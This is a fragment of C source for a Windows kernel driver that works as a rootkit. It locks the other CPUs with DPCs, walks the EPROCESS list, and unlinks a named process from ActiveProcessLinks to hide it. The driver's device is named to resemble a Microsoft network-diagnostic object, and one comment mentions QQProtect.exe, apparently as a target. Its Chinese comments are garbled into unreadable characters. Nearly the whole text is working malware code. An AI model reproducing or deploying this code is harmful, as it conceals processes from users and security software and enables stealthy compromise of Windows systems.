	DBG_PRINT2("[dispatchIOControl]:outputBuffer=%s\n", ptrBuffer);
	return;
}


// �� windows 7 �ں��У�OS �� _EPROCESS.ImageFileName[] ���鳤��Ϊ15�ֽڣ������Ĳ��ֻᱻ�ضϣ�
	//��OS �����а� _EPROCESS.ImageFileName[14]���Ϊ\0�����Բ���Ҫ�õ��˺���

/*void  getProcessName(char  *dest, char  *src){
	

	//		BYTE					BYTE*
	// dest:processName   src: (currentEPROCESSpointer + EPROCESS_OFFSET_NAME) ����ӳ���������Ƴ���Ϊ16�ֽ� 
	strncpy(dest, src, SZ_EPROCESS_NAME);

	// ���һ��Ԫ�أ�16-1=15��Ϊ��ʾ�ַ�����β��\0 �ַ�
	dest[SZ_EPROCESS_NAME - 1] = '\0';

	return;
}*/


NTSTATUS RegisterDriverDeviceName(IN PDRIVER_OBJECT DriverObject)
{
	NTSTATUS ntStatus;
	UNICODE_STRING name_String;
	/* ����DeviceNameBuffer����ʼ��name_String */
	RtlInitUnicodeString(&name_String, DeviceNameBuffer);
	/*
	* ����һ���豸���豸����ΪFILE_DEVICE_RK���������Լ���ctrlcode.h�ж���)��
	* �������豸������MSNetDiagDeviceObject��
	*/
	ntStatus = IoCreateDevice
	(
		DriverObject,
		0,
		&name_String,
		FILE_DEVICE_RK,
		0,
		TRUE, &MSNetDiagDeviceObject
	);
	return (ntStatus);
}



NTSTATUS RegisterDriverDeviceLink()
{
	NTSTATUS ntStatus;
	UNICODE_STRING device_String;
	UNICODE_STRING unicodeLinkString;
	RtlInitUnicodeString(&device_String, DeviceNameBuffer);
	RtlInitUnicodeString(&unicodeLinkString, DeviceLinkBuffer);
	/*
	* IoCreateSymbolicLink����һ���豸���ӡ�������������Ȼע�����豸��
	* ����ֻ�����ں��пɼ���Ϊ��ʹӦ�ó���ɼ���������Ӵ����¶һ������
	* ���ӣ�������ָ���������豸��
	*/
	ntStatus = IoCreateSymbolicLink
	(
		&unicodeLinkString, 
		&device_String
	);
	return (ntStatus);
}


//������Щ����������SMPϵͳ��ͬ����Windows�ں���Դ�ķ��ʣ�����Ҫôֱ�ӻ����� HideProcess() �б����ã�

KIRQL  RaiseIRQL() {
	KIRQL  curr;
	KIRQL  prev;
	curr = KeGetCurrentIrql();
	if (curr < DISPATCH_LEVEL) {
		KeRaiseIrql(DISPATCH_LEVEL, &prev);
	}
	prev = curr;
	return prev;
}


PKDPC  AcquireLock() {
	PKDPC  dpcArray;
	DWORD  current_cpu;
	DWORD  i;
	DWORD  nOtherCPUs;
	if (KeGetCurrentIrql() != DISPATCH_LEVEL) {
		return  NULL;
	}
	DBG_TRACE("AcquireLock", "current cpu Executing at IRQL == DISPATCH_LEVEL");
	InterlockedAnd(&has_finished_access_os_res, 0);
	InterlockedAnd(&nCPUsLocked, 0);
	DBG_PRINT2("[AcquireLock]:  CPUs number = %u\n", KeNumberProcessors);// %u:  �޷���ʮ����������

														    //�˴��� ExAllocatePoolWithTag() �������Ĳ���������Ҫ������д����������δ֪ԭ�򣬻ᱨ��ú���δ����
	dpcArray = (PKDPC)ExAllocatePoolWithTag(NonPagedPool,
		KeNumberProcessors * sizeof(KDPC), 0xABCD);
	if (dpcArray == NULL) {
		return  NULL;
	}
	current_cpu = KeGetCurrentProcessorNumber();
	DBG_PRINT2("[AcquireLock]:  current_cpu = Core %u\n", current_cpu);
	for (i = 0; i < KeNumberProcessors; i++) {
		PKDPC  dpcPtr = &(dpcArray[i]);
		if (i != current_cpu) {
			KeInitializeDpc(dpcPtr, lockRoutine, NULL);
			KeSetTargetProcessorDpc(dpcPtr, i);
			KeInsertQueueDpc(dpcPtr, NULL, NULL);
		}
	}
	nOtherCPUs = KeNumberProcessors - 1;
	InterlockedCompareExchange(&nCPUsLocked, nOtherCPUs, nOtherCPUs);
	while (nCPUsLocked != nOtherCPUs) {
		__asm {
			nop;
		}
		InterlockedCompareExchange(&nCPUsLocked, nOtherCPUs, nOtherCPUs);
	}
	DBG_TRACE("AcquireLock", "All the other CPUs have been raise to DISPATCH_LEVEL and entered nop-loop, now we can call WalkProcessList() to mutex access resource");
	return  dpcArray;
}


void  lockRoutine(IN  PKDPC  dpc, IN  PVOID  context, IN  PVOID  arg1, IN  PVOID  arg2) {
	DBG_PRINT2("[lockRoutine]:   CPU[%u]  entered nop-loop", KeGetCurrentProcessorNumber());
	InterlockedIncrement(&nCPUsLocked);
	while (InterlockedCompareExchange(&has_finished_access_os_res, 1, 1) == 0) {
		__asm {
			nop;
		}
	}
	InterlockedDecrement(&nCPUsLocked);
	DBG_PRINT2("lockRoutine]:   CPU[%u]  exited nop-loop", KeGetCurrentProcessorNumber());
	return;
}


NTSTATUS  ReleaseLock(PVOID  dpc_pointer) {
	InterlockedIncrement(&has_finished_access_os_res);
	InterlockedCompareExchange(&nCPUsLocked, 0, 0);
	while (nCPUsLocked != 0) {
		__asm {
			nop;
		}
		InterlockedCompareExchange(&nCPUsLocked, 0, 0);
	}
	if (dpc_pointer != NULL) {
		ExFreePool(dpc_pointer);
	}
	DBG_TRACE("ReleaseLock", "All the other CPUs have been exited nop-loop and down to origional IRQL, and these dpc have been released");
	return STATUS_SUCCESS;
}


void  LowerIRQL(KIRQL  prev) {
	KeLowerIrql(prev);
	DBG_TRACE("LowerIRQL", "current cpu also down to origional IRQL");
	return;
}



void  HideProcessWithName(unsigned char* trg_proc_nme){

	old_irql = RaiseIRQL();
	dpcPointer = AcquireLock();
	WalkProcessListWithName(trg_proc_nme);
	ReleaseLock(dpcPointer);
	LowerIRQL(old_irql);


return;

}



void  WalkProcessListWithName(unsigned char* trg_proc_nme){


	BYTE*   currentEPROCESSpointer = NULL;
	BYTE*   nextEPROCESSpointer = NULL;
	unsigned char*  current_proc_name = NULL;
	unsigned char*  target_proc_name = NULL;

	//BYTE  processName[SZ_EPROCESS_NAME];

	int  fuse = 0;
	const  int  walkThreshold = 1048576;


	currentEPROCESSpointer = (UCHAR*)PsGetCurrentProcess();


	current_proc_name = get_proc_name(currentEPROCESSpointer);


	target_proc_name = current_proc_name;

	/*���stricmp ϵ�����̾�ȷҪ��Ƚ�������\0��β���ַ���������Ҫ��ǰ�ѻ�ȡ���Ľ��������Ƶ����������ڣ�Ȼ���������һ��
	�ַ�Ϊ\0������Ӳ�����\0��βȫ���ַ�����QQProtect.exe\0���Ƚ�*/

	//getProcessName(processName, current_proc_name);


	/*if ( stricmp(trg_proc_nme, processName) == 0 )
	{
		adjustProcessListEntryWithProcName(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , name =  %s..........................", current_proc_name);
		return;
	}*/

	
	if ( _stricmp(trg_proc_nme, current_proc_name) == 0 )
	{
		adjustProcessListEntryWithProcName(currentEPROCESSpointer);
		DBG_PRINT2("...........................hidding process , name =  %s..........................", current_proc_name);
		return;
	}



	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
	currentEPROCESSpointer = nextEPROCESSpointer;
	current_proc_name = get_proc_name(currentEPROCESSpointer);

// ����ִ�е��˴���current_proc_name����һ����������
//				target_proc_name����ǰ��������
//				nextEPROCESSpointer��ָ����һ������
//				currentEPROCESSpointer��ָ����һ������
// �����˺������߼�����
// while ѭ���˳��������ǣ�target_proc_name == current_proc_name����Ϊǰ��Ĵ����߼��� target_proc_name ��ʼ��Ϊ��ǰִ�н��̵����ƣ�
//Ȼ�󱣳ֲ��䣬���ҵ�ǰִ�н��̵� EPROCESS �ṹ��Ϊ����ͷ������ target_proc_name ���ܹ���ʶ��ͷ��������
//��һ���棬�ֲ����� current_proc_name ��ÿһ��ѭ���ĵ����ж������£��� current_proc_name ���� target_proc_name ʱ��
//˵�����ε�������������Ľ�β
//����β����� LIST_ENTRY.Flink ָ���ͷ�� LIST_ENTRY.Flink������ current_proc_name �ٴα�����Ϊ��ͷ���̵� PID ʱ���˳�ѭ����



	//while ( stricmp(target_proc_name, current_proc_name) != 0 )
	while ( _stricmp(target_proc_name, current_proc_name) != 0 )
	{
		if ( _stricmp(trg_proc_nme, current_proc_name) == 0 ){
			adjustProcessListEntryWithProcName(currentEPROCESSpointer);
			DBG_PRINT2(".....................hidding process , name =  %s............................", current_proc_name);
			return;
		}

		nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);
		currentEPROCESSpointer = nextEPROCESSpointer;
		current_proc_name = get_proc_name(currentEPROCESSpointer);

		fuse++;

		if (fuse == walkThreshold){
			return;
		}

	}

	DBG_PRINT2(".................searched  %d  Processes, no mattch one\n...................", fuse);
	DBG_PRINT2("......................NO match Process for name =  %s\n.............................", target_hide_process_name);
	return;


}


void  adjustProcessListEntryWithProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  nextEPROCESSpointer = NULL;


	LIST_ENTRY*  currentListEntry;
	LIST_ENTRY*  prevListEntry;
	LIST_ENTRY*  nextListEntry;

	prevEPROCESSpointer = getPreviousEPROCESSpointerForProcName(currentEPROCESSpointer);
	nextEPROCESSpointer = getNextEPROCESSpointerForProcName(currentEPROCESSpointer);

//�ֱ�ȡ�õ�ǰ�����ڵ� 2 �� ERROCESS �� ActiveProcessLinks �ֶΣ�һ�� LIST_ENTRY ����

	currentListEntry = ((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	prevListEntry = ((LIST_ENTRY*)(prevEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	nextListEntry = ((LIST_ENTRY*)(nextEPROCESSpointer + EPROCESS_OFFSET_LINKS));

//�ֱ��޸������е��ض��ֶΣ�Flink �� Blink����ʵ�����ص�ǰ�� ERROCESS

//ǰһ�� ERROCESS  �� ActiveProcessLinks.Flink ָ����һ�� ERROCESS  �� ActiveProcessLinks.Flink
//��һ�� ERROCESS  �� ActiveProcessLinks.Blink ָ��ǰһ�� ERROCESS  �� ActiveProcessLinks.Flink
//����ƹ��˵�ǰ���м䣩�� ERROCESS �� ActiveProcessLinks
	(*prevListEntry).Flink = nextListEntry;
	(*nextListEntry).Blink = prevListEntry;

//��ǰ ERROCESS �� ActiveProcessLinks.Flink �� ActiveProcessLinks.Blink ָ�� ActiveProcessLinks ����
//�������з���
	(*currentListEntry).Flink = currentListEntry;
	(*currentListEntry).Blink = currentListEntry;

	return;
}


BYTE*  getNextEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  nextEPROCESSpointer = NULL;
	BYTE*  flink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	flink = (BYTE*)(ListEntry.Flink);
	nextEPROCESSpointer = (flink - EPROCESS_OFFSET_LINKS);
	return nextEPROCESSpointer;
}



BYTE*  getPreviousEPROCESSpointerForProcName(BYTE*  currentEPROCESSpointer)
{
	BYTE*  prevEPROCESSpointer = NULL;
	BYTE*  blink = NULL;
	LIST_ENTRY  ListEntry;
	ListEntry = *((LIST_ENTRY*)(currentEPROCESSpointer + EPROCESS_OFFSET_LINKS));
	blink = (BYTE*)(ListEntry.Blink);
	prevEPROCESSpointer = (blink - EPROCESS_OFFSET_LINKS);
	return prevEPROCESSpointer;
}


unsigned char*  get_proc_name(BYTE*  currentEPROCESSpointer){
	
	unsigned char* proc_name;

// _EPROCESS.ImageFileName �ֶξ���һ�� UCHAR���༴ unsigned char�������飬
//�� NT5.2 ���ںˣ�����windows xp ,2003���г��� 16 �ֽڣ��� NT6.2 ���ںˣ�����windows 7, 2008���г��� 15 �ֽ�
	proc_name = (unsigned char*)(currentEPROCESSpointer + EPROCESS_OFFSET_NAME);
	return (proc_name);
}





